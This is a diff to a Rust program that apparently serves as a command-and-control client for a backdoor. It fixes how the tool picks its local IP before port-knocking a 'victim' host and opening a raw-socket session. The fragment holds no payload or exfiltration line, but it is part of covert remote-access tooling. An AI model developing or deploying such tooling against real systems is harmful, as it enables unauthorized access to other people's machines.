@@ -1,10 +1,10 @@
 use std::io::{self, Write};
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::net::{TcpStream, IpAddr, Ipv4Addr};
+use std::net::{IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
-use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
+use pnet::transport::{transport_channel, TransportChannelType::Layer3};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::Packet;
 use pnet::datalink;
@@ -194,29 +194,28 @@ impl Commander {
         }
     }
 
-    // In main.rs
-
     fn initiate_connection(&mut self) {
         let target_ip_str = prompt("Target IP [127.0.0.1]: ");
         let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
 
-        match port_knkr::port_knock(ip) {
+        // FIX: Find the local IP *before* we knock, so we can pass it as the src_ip
+        let local_ip = if let Some((iface_name, local_v4)) = Self::find_interface_for_target(ip) {
+            println!("[*] Using interface: {} with IP: {}", iface_name, local_v4);
+            local_v4
+        } else {
+            println!("[!] Warning: Could not find best interface, falling back to 127.0.0.1");
+            Ipv4Addr::new(127, 0, 0, 1)
+        };
+
+        // FIX: Pass local_ip (src_ip) and ip (dest_ip) to port_knock
+        match port_knkr::port_knock(local_ip, ip) {
             Ok(session) => {
                 self.victim_ip = Some(ip);
+                self.local_ip = Some(local_ip); // Store the local IP we found
                 self.tx_port = session.tx_port;
                 self.rx_port = session.rx_port;
                 self.knock_session = Some(session);
                 
-                // FIX: Identify local IP and interface properly
-                if let Some((iface_name, local_v4)) = Self::find_interface_for_target(ip) {
-                    println!("[*] Using interface: {} with IP: {}", iface_name, local_v4);
-                    self.local_ip = Some(local_v4);
-                } else {
-                    // Fallback to loopback if nothing else is found
-                    println!("[!] Warning: Could not find best interface, falling back to 127.0.0.1");
-                    self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
-                }
-
                 self.running.store(true, Ordering::SeqCst);
                 self.state = SessionState::Connected;
                 self.spawn_listener(); 
